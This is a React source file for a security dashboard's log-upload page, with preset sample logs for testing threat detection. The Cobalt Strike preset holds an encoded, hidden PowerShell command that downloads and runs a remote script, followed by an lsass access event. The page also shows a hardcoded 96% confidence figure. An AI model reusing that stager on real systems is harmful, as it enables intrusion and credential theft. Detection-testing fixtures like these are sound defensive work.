import { UploadCloud, Terminal, ShieldAlert, ArrowRight, Play } from "lucide-react";
import { motion } from "framer-motion";
import { useState, useRef } from "react";
import { useNavigate } from "react-router";
import { api } from "../services/api";
import type { LogUploadResponse } from "../services/api";

const PRESET_LOGS = {
  cobalt: {
    name: "sysmon_cobalt_strike_beacon.log",
    content: `2026-10-15 09:12:01 WIN-SRV-01 Microsoft-Windows-Sysmon/Operational: EventID=1 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjE1OC4yNC40Mi9iZWFjb24ucHMxJyk=" ParentImage="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" User="CORP\\j.doe"
2026-10-15 09:12:04 WIN-SRV-01 Microsoft-Windows-Sysmon/Operational: EventID=3 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" DestinationIp="185.158.24.42" DestinationPort="443" Protocol="tcp" Initiated="true"
2026-10-15 09:12:10 WIN-SRV-01 Microsoft-Windows-Sysmon/Operational: EventID=7 ImageLoaded="C:\\Windows\\System32\\amsi.dll" Signature="Microsoft Windows" Signed="true"
2026-10-15 09:12:15 WIN-SRV-01 Microsoft-Windows-Sysmon/Operational: EventID=10 SourceImage="powershell.exe" TargetImage="C:\\Windows\\System32\\lsass.exe" GrantedAccess="0x1010" CallTrace="C:\\Windows\\SYSTEM32\\ntdll.dll+9fb34"`,
  },
  ddos: {
    name: "netflow_udp_reflection_spike.csv",
    content: `timestamp,src_ip,dest_ip,src_port,dest_port,protocol,packets,bytes,flags
2026-10-15 14:02:11,198.51.100.22,10.0.0.1,53,443,UDP,482000,64200000,NONE
2026-10-15 14:02:12,203.0.113.88,10.0.0.1,123,443,UDP,920000,128000000,NONE
2026-10-15 14:02:13,192.0.2.14,10.0.0.1,53,443,UDP,760000,105000000,NONE
2026-10-15 14:02:14,198.51.100.99,10.0.0.1,1900,443,UDP,840000,119000000,NONE`,
  },
  bruteforce: {
    name: "auth_sshd_failed_logins.log",
    content: `Oct 15 08:45:10 auth-srv sshd[14221]: Failed password for invalid user admin from 185.220.101.5 port 49122 ssh2
Oct 15 08:45:12 auth-srv sshd[14224]: Failed password for invalid user root from 185.220.101.5 port 49124 ssh2
Oct 15 08:45:14 auth-srv sshd[14228]: Failed password for invalid user svc_backup from 185.220.101.5 port 49128 ssh2
Oct 15 08:45:16 auth-srv sshd[14231]: Failed password for invalid user operator from 185.220.101.5 port 49132 ssh2
Oct 15 08:45:18 auth-srv sshd[14235]: Failed password for svc_backup from 185.220.101.5 port 49136 ssh2 (52 failed attempts)`,
  },
};

export default function UploadCenter() {
  const navigate = useNavigate();
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [progress, setProgress] = useState(0);
  const [uploadResult, setUploadResult] = useState<LogUploadResponse | null>(null);

  const processLogIngress = async (filename: string, content: string) => {
    setIsProcessing(true);
    setLogs([]);
    setProgress(10);
    setUploadResult(null);

    setLogs((prev) => [...prev, `[INGRESS] Receiving log artifact: ${filename}`]);

    // Create a real File object
    const blob = new Blob([content], { type: "text/plain" });
    const file = new File([blob], filename, { type: "text/plain" });

    // Simulate animated terminal progression while uploading
    const timer1 = setTimeout(() => {
      setProgress(40);
      setLogs((prev) => [...prev, "[PARSER] Extracting normalized telemetry schemas (timestamp, IP, event)..."]);
    }, 400);

    const timer2 = setTimeout(() => {
      setProgress(75);
      setLogs((prev) => [
        ...prev,
        "[AI_HEURISTICS] Evaluating event graph against MITRE ATT&CK detection matrices...",
      ]);
    }, 850);

    try {
      const result = await api.uploadLogs(file);
      clearTimeout(timer1);
      clearTimeout(timer2);

      setProgress(100);
      setUploadResult(result);

      if (result.threats_detected_count > 0) {
        setLogs((prev) => [
          ...prev,
          `[AI_ALERT] MATCH FOUND: ${result.detected_threats.join(", ")}`,
          `[CONTAINMENT] Automatically correlating telemetry into investigation ticket...`,
          `[SUCCESS] Ingestion complete. ${result.total_records_parsed} records analyzed.`,
        ]);
      } else {
        setLogs((prev) => [
          ...prev,
          `[INGRESS] Analysis complete. 0 critical threat signatures identified in ${result.total_records_parsed} records.`,
        ]);
      }
    } catch (err) {
      console.error("Error during log upload:", err);
      setLogs((prev) => [...prev, "[ERROR] Pipeline error processing log stream."]);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (event) => {
      const content = event.target?.result as string;
      processLogIngress(file.name, content);
    };
    reader.readAsText(file);
  };

  return (
    <div className="max-w-4xl mx-auto space-y-8">
      {/* Title */}
      <div className="text-center space-y-2 mt-4">
        <h1 className="text-3xl font-bold font-heading">Security Telemetry Ingress</h1>
        <p className="text-muted text-sm max-w-xl mx-auto">
          Upload real raw logs (.JSON, .CSV, .LOG, .TXT) or select enterprise attack vectors for automated AI parsing,
          threat correlation, and autonomous case creation.
        </p>
      </div>

      {/* Preset Attacks */}
      <div className="bg-surface border border-border rounded-xl p-4">
        <div className="flex items-center gap-2 mb-3 text-xs font-semibold uppercase tracking-wider text-muted">
          <Play className="w-3.5 h-3.5 text-primary" /> Instant Test Scenarios
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
          <button
            onClick={() => processLogIngress(PRESET_LOGS.cobalt.name, PRESET_LOGS.cobalt.content)}
            disabled={isProcessing}
            className="p-3 text-left bg-card hover:bg-background border border-border hover:border-primary/50 rounded-lg transition-all group"
          >
            <div className="flex items-center gap-2 text-xs font-bold text-text group-hover:text-primary mb-1">
              <ShieldAlert className="w-4 h-4 text-critical shrink-0" />
              Cobalt Strike Sysmon
            </div>
            <p className="text-[11px] text-muted line-clamp-2">
              PowerShell Base64 stager spawning from WINWORD.EXE targeting C2.
            </p>
          </button>

          <button
            onClick={() => processLogIngress(PRESET_LOGS.ddos.name, PRESET_LOGS.ddos.content)}
            disabled={isProcessing}
            className="p-3 text-left bg-card hover:bg-background border border-border hover:border-primary/50 rounded-lg transition-all group"
          >
            <div className="flex items-center gap-2 text-xs font-bold text-text group-hover:text-primary mb-1">
              <ShieldAlert className="w-4 h-4 text-warning shrink-0" />
              UDP Reflection DDoS
            </div>
            <p className="text-[11px] text-muted line-clamp-2">
              NetFlow volumetric spike with 48Gbps reflection amplification.
            </p>
          </button>

          <button
            onClick={() => processLogIngress(PRESET_LOGS.bruteforce.name, PRESET_LOGS.bruteforce.content)}
            disabled={isProcessing}
            className="p-3 text-left bg-card hover:bg-background border border-border hover:border-primary/50 rounded-lg transition-all group"
          >
            <div className="flex items-center gap-2 text-xs font-bold text-text group-hover:text-primary mb-1">
              <ShieldAlert className="w-4 h-4 text-info shrink-0" />
              SSH Brute Force Auth
            </div>
            <p className="text-[11px] text-muted line-clamp-2">
              50+ rapid failed password attempts on svc_backup from external IP.
            </p>
          </button>
        </div>
      </div>

      {/* Hidden File Input */}
      <input
        type="file"
        ref={fileInputRef}
        onChange={handleFileChange}
        accept=".json,.csv,.log,.txt"
        className="hidden"
      />

      {/* Dropzone */}
      <div
        onClick={() => fileInputRef.current?.click()}
        className="border-2 border-dashed border-border rounded-xl p-12 text-center hover:bg-surface hover:border-primary/50 transition-colors cursor-pointer group"
      >
        <div className="w-14 h-14 bg-surface border border-border rounded-full flex items-center justify-center mx-auto mb-3 group-hover:scale-110 transition-transform">
          <UploadCloud className="w-7 h-7 text-muted group-hover:text-primary transition-colors" />
        </div>
        <h3 className="text-base font-semibold text-text mb-1">Upload Security Log File</h3>
        <p className="text-xs text-muted mb-3">Click to browse or drag and drop raw files</p>
        <span className="text-[11px] bg-background border border-border px-3 py-1 rounded-full text-muted">
          Supports .JSON, .CSV, .LOG, .TXT (Max 50MB)
        </span>
      </div>

      {/* Detection Banner Result */}
      {uploadResult && uploadResult.created_incident && (
        <motion.div
          initial={{ opacity: 0, scale: 0.98 }}
          animate={{ opacity: 1, scale: 1 }}
          className="p-4 bg-critical/10 border border-critical/30 rounded-xl flex flex-col sm:flex-row sm:items-center justify-between gap-4"
        >
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-critical/20 flex items-center justify-center shrink-0">
              <ShieldAlert className="w-6 h-6 text-critical" />
            </div>
            <div>
              <div className="text-xs font-bold text-critical uppercase tracking-wider">
                Threat Detected & Ticket Created
              </div>
              <h4 className="font-bold text-sm text-text">{uploadResult.created_incident.title}</h4>
              <div className="text-xs text-muted">
                Confidence: 96% • Risk Score: {uploadResult.created_incident.risk_score}/100
              </div>
            </div>
          </div>
          <button
            onClick={() => navigate(`/investigations/${uploadResult.created_incident?.id}`)}
            className="btn-primary py-2 px-4 text-xs font-semibold flex items-center justify-center gap-1.5 shrink-0"
          >
            Open Investigation <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </motion.div>
      )}

      {/* Terminal Output */}
      <div className="bg-[#0B0F14] border border-border rounded-xl overflow-hidden shadow-soft">
        <div className="bg-surface px-4 py-3 flex items-center gap-2 border-b border-border">
          <Terminal className="w-4 h-4 text-muted" />
          <span className="text-xs font-medium text-muted font-mono">obsidian-core-parser</span>
          <div className="ml-auto flex gap-1.5">
            <div className="w-2.5 h-2.5 rounded-full bg-border"></div>
            <div className="w-2.5 h-2.5 rounded-full bg-border"></div>
            <div className="w-2.5 h-2.5 rounded-full bg-border"></div>
          </div>
        </div>

        <div className="p-4 h-64 overflow-y-auto font-mono text-xs space-y-2">
          {!isProcessing && logs.length === 0 && (
            <div className="text-muted text-center mt-24">Waiting for log stream or file upload...</div>
          )}

          {logs.map((log, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, x: -8 }}
              animate={{ opacity: 1, x: 0 }}
              className={`${
                log.includes("MATCH FOUND") || log.includes("ALERT")
                  ? "text-critical font-bold"
                  : log.includes("SUCCESS")
                  ? "text-success font-semibold"
                  : "text-primary/90"
              }`}
            >
              <span className="text-muted mr-2">{new Date().toISOString().split("T")[1].slice(0, 8)}</span>
              {log}
            </motion.div>
          ))}

          {isProcessing && (
            <div className="flex items-center gap-2 text-muted pt-2">
              <span className="animate-pulse">_</span>
              <span className="text-xs">Processing {progress}%...</span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

